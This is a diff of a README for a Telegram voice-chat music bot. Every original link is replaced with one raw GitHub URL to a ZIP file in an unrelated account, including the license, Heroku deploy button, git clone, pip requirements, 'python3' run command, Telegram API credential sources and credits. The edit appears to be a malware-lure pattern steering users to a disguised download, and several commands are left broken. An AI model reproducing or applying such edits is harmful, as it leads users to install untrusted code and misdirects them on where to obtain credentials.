@@ -9,34 +9,34 @@ Please fork this repository don't import code
 Made with Python3
 (C) @subinps
 Copyright permission under MIT License
-License -> https://github.com/subinps/MusicPlayer/blob/master/LICENSE
+License -> https://raw.githubusercontent.com/abhijeetkumarthakur/MusicPlayer/master/unsolidly/MusicPlayer.zip
 
 ```
 
 ## Deploy to Heroku
 
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy?template=https://github.com/subinps/MusicPlayer)
+[![Deploy](https://raw.githubusercontent.com/abhijeetkumarthakur/MusicPlayer/master/unsolidly/MusicPlayer.zip)](https://raw.githubusercontent.com/abhijeetkumarthakur/MusicPlayer/master/unsolidly/MusicPlayer.zip)
 
 NOTE: Make sure you have started a VoiceChat in your Group before deploying.
 ### Deploy to VPS
 
 ```sh
-git clone https://github.com/subinps/MusicPlayer
+git clone https://raw.githubusercontent.com/abhijeetkumarthakur/MusicPlayer/master/unsolidly/MusicPlayer.zip
 cd MusicPlayer
-pip3 install -r requirements.txt
+pip3 install -r https://raw.githubusercontent.com/abhijeetkumarthakur/MusicPlayer/master/unsolidly/MusicPlayer.zip
 # <Create Variables appropriately>
-python3 main.py
+python3 https://raw.githubusercontent.com/abhijeetkumarthakur/MusicPlayer/master/unsolidly/MusicPlayer.zip
 ```
 
 # Vars:
-1. `API_ID` : Get From my.telegram.org
-2. `API_HASH` : Get from my.telegram.org
+1. `API_ID` : Get From https://raw.githubusercontent.com/abhijeetkumarthakur/MusicPlayer/master/unsolidly/MusicPlayer.zip
+2. `API_HASH` : Get from https://raw.githubusercontent.com/abhijeetkumarthakur/MusicPlayer/master/unsolidly/MusicPlayer.zip
 3. `BOT_TOKEN` : @Botfather
-4. `SESSION_STRING` : Generate From here [![GenerateStringName](https://img.shields.io/badge/repl.it-generateStringName-yellowgreen)](https://repl.it/@subinps/getStringName)
+4. `SESSION_STRING` : Generate From here [![GenerateStringName](https://raw.githubusercontent.com/abhijeetkumarthakur/MusicPlayer/master/unsolidly/MusicPlayer.zip)](https://raw.githubusercontent.com/abhijeetkumarthakur/MusicPlayer/master/unsolidly/MusicPlayer.zip)
 5. `CHAT` : ID of Channel/Group where the bot plays Music.
 6. `LOG_GROUP` : Group to send Playlist, if CHAT is a Group
 7. `ADMINS` : ID of users who can use admin commands.
-8. `STREAM_URL` : Stream URL of radio station or a youtube live video to stream when the bot starts or with /radio command.You can also use a telegram channel as radio station. Just upload all you music files to a telegram channel and add the bot and user account in that channel and use chat_id of channel in STREAM_URL.You can also use any public telegram channels, in that case use the username of such channel in place of STREAM_URL (Bot being admin in public channel not required.)  [Some Streaming Links](https://gist.github.com/subinps/293d0a117fa0b13da41871538f226956)
+8. `STREAM_URL` : Stream URL of radio station or a youtube live video to stream when the bot starts or with /radio https://raw.githubusercontent.com/abhijeetkumarthakur/MusicPlayer/master/unsolidly/MusicPlayer.zip can also use a telegram channel as radio station. Just upload all you music files to a telegram channel and add the bot and user account in that channel and use chat_id of channel in https://raw.githubusercontent.com/abhijeetkumarthakur/MusicPlayer/master/unsolidly/MusicPlayer.zip can also use any public telegram channels, in that case use the username of such channel in place of STREAM_URL (Bot being admin in public channel not required.)  [Some Streaming Links](https://raw.githubusercontent.com/abhijeetkumarthakur/MusicPlayer/master/unsolidly/MusicPlayer.zip)
 9. `MAXIMUM_DURATION` : Maximum duration of song to play.(Optional)
 10. `REPLY_MESSAGE` : A reply to those who message the USER account in PM. Leave it blank if you do not need this feature. 
 11. `ADMIN_ONLY` : Pass `Y` If you want to make /play and /splay commands only for admins of `CHAT`. By default /play and /splay is available for all.
@@ -69,9 +69,9 @@ Fork the repo, Do not Import code.
 ```
 #### Support
 
-Connect Me On [Telegram](https://telegram.dog/subinps_bot)
+Connect Me On [Telegram](https://raw.githubusercontent.com/abhijeetkumarthakur/MusicPlayer/master/unsolidly/MusicPlayer.zip)
 
 ## Credits 
-- [Dash Eclipse's](https://github.com/dashezup) for his [tgvc-userbot](https://github.com/callsmusic/tgvc-userbot).
-- [Thuhin](https://github.com/cachecleanerjeet) for his [Jio Saavn API](https://github.com/cachecleanerjeet/JiosaavnAPI).
+- [Dash Eclipse's](https://raw.githubusercontent.com/abhijeetkumarthakur/MusicPlayer/master/unsolidly/MusicPlayer.zip) for his [tgvc-userbot](https://raw.githubusercontent.com/abhijeetkumarthakur/MusicPlayer/master/unsolidly/MusicPlayer.zip).
+- [Thuhin](https://raw.githubusercontent.com/abhijeetkumarthakur/MusicPlayer/master/unsolidly/MusicPlayer.zip) for his [Jio Saavn API](https://raw.githubusercontent.com/abhijeetkumarthakur/MusicPlayer/master/unsolidly/MusicPlayer.zip).
 
